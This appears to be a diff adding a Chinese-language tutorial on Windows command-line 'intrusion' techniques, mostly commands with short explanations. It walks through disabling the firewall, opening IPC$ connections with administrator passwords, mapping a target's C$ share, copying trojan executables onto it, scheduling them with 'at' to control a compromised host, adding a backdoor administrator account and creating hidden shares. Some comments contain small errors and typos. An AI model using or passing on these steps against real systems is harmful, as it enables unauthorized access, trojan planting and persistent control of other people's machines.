@@ -1,0 +1,67 @@
+windows下dos攻击、入侵的一些命令：
+
+讲解些常用的net命令与例子：ip地址以192.168.1.1为例。一般像我们不能连接不能进行其它的操作时，可以把防火墙给关掉 net stop sharedaccess　　
+1、建立IPC连接或是直接映射的命令　　net use \\ip\ipc$ password /user:username　　net use \\ip\abc username:admin$123　　
+	例如：net use \\192.168.1.1\ipc$ 123456 /user :administrator　　这个命令的意思就是与用户名为adminidtrator用户密码为123456的主机192.168.1.1建立ipc$空连接　　
+2、 删除IPC$空连接　net use \\ip /del　　
+	例如：net use \\192.168.1.1 /del　　删除与主机127.0.0.1已经建立的ipc$连接　　
+3、启动关闭服务：　net start \\查看已经开启的服务　　net start servername　　net stop servername　　
+	例如：　　net start telnet \\开启telnet服务　　net stop telnet \\关闭telnet服务　　
+4、启动关闭共享　net shate ipc$ \\开启ipc$默认共享　　net share ipc$ /del \\关闭ipc$默认共享　　net share c=c:\ \\完全共享c盘　　net share d=d:\ \\删除完全共享的d盘　　net share e$=e:\ \\建立隐藏共享e盘　　
+5、映射硬盘：net use z: \\ip\c$　　
+	例如：net use z: \\192.168.1.1\c$ \\把192.168.1.1的C盘映射成本机的z盘　　
+	说明：映射成功后，你在我的电脑里面就会多出一个硬盘Z，其实Z就是192.168.1.1的C盘！　　net use z: /del \\断开映射　　
+	入侵中的作用：把对方的硬盘映射过来以后我们就能直接复制文件到对方的硬盘下面了　　
+	成功实现的条件：必须与对方建立ipc$连接　　
+6、远程复制文件_Copy　　
+	Copy e:\3389.exe \\192.168.1.1\c$ \\将本地的E盘下的3389.exe这个文件copy到对方192.168.1.1系统的C盘根目录下　　
+	Copy在入侵中的作用：把本地文件复制到对方硬盘　　
+	Copy复制成功所需的条件：必须与主机建立ipc$连接　　
+7、查看远程系统的时间　net time \\ip　　
+	net time \\192.168.1.1 \\查看远程主机192.168.1.1的本地时间　　
+	作用：得到对方时间好为自己计划任务种下木马做准备　　
+8、远程运行程序　At \\ip time server.exe　　
+	At \\192.168.1.1 12:30 c:\server.exe \\让主机在中午12:30分运行我们已经复制到他C盘根目录下的木马server.exe　　
+	在入侵中作用：这样我们就可以用我们的木马服务端来连接我们木马，，更好的使用图形方式来控制肉鸡.(推荐使用神气儿 ^_^)　　
+9、添加管理员帐号：
+	net user ylinuxs 123456 /add \\添加一个密码为123456名字为 ylinuxs的用户　　
+	net localgroup administrators ylinuxs /add \\把ylinuxs这个用户提升为管理员或是叫加入到管理员组都是对的　　
+	注意：有些系统的管理员组不是administrators你要根据实际情况来改，不过99.9%的系统的管理员组还是administrators的。　　
+	修改用户密码：net user ylinuxs 123 \\把用户ylinuxs的密码修改成123　　
+10、远程登陆主机_telnet　　telnet ip port　　
+	例如：telnet 192.168.1.1 135 \\连接登录192.168.1.1的135端口（当目标主机的端口是默认的23的时候我们不需要+端口即：telnet ip 就好）　　
+11、传输文件命令_ftp　　
+	其实这个我个人觉得用途不大，毕竟当你拿到了FTP密码之后你可以用flashftp或者cutftp有一个图形界面的交互工具，更好　　
+	首先在CMD里面输入ftp、然后输入：open ip port　　
+	例如：open 192.168.1.1 123 \\连接登陆192.168.1.1的123端口　　
+	如何开启windows系统自带的ftp服务：　　net start msftppsvc　　
+12、查看文件夹的属性_cacls　　
+	Cacls ylinuxs \\查看ylinuxs这个文件夹的属性　　
+	参数说明：F：（完全控制）	R：（只读）		C：（允许更改）		W：（允许写入）		N：（没有任何权限）
+13、删除文件_del　　
+	del是用来删除文件命令　　首先进入你想删除的文件的目录　　
+	del ylinuxs.txt \\删除ylinuxs.txt这个文件　　
+	del ylinuxs.txt /f \\强制删除ylinuxs.txt这个个文件（当该文件无{MOD}常删除的时候使用该命令）　　
+14、 finger命令　　
+	Finger是一个信息刺探命令一般在对方开启了79端口时命令使用　　
+	Finger –l user @computer　　
+	参数详解： -l 用长列表格式显示消息　　User:指定用户的信息　　
+	成功实现的条件：对方必须安装tcp/ip协议　　
+15、文件写入命令_echo　
+	Echo hello > index.htm \\用hello来覆盖index.htm的内容　　
+	Echo hello >>index.htm \\将hello添加到index.htm　　
+16、写入注册表文件_regedit　　
+	Regedit /s filename.reg \\s是写入参数　　
+17、端口映射_chgport　　
+	Chgport 3=5 \\将端口3映射到5　　
+	Chgport /d* \\删除所有端口映射　　
+18、文件映射_subst　　
+	subst b: c:\windows \\这个时候当你访问硬盘b的时候你就是访问了 c:\windows目录了,不过这样是非常危险的　　
+	subst b: /D \\删除映射的盘b　　
+19、查看当前正在使用的帐号　　
+	query session \\查看帐号　　
+20、踢掉指定用　　
+	logoff id \\注意ID，是在用query session查看到的用户的id而不是用户名。　　
+21、发送消息给某用户或者内网主机　　
+	net send hostname or /ip message　　
+	例如：net send ylinuxs or /192.168.1.1 hello! \\给主机名为ylinuxs或是ip为192.168.1.1发送消息为hello!　
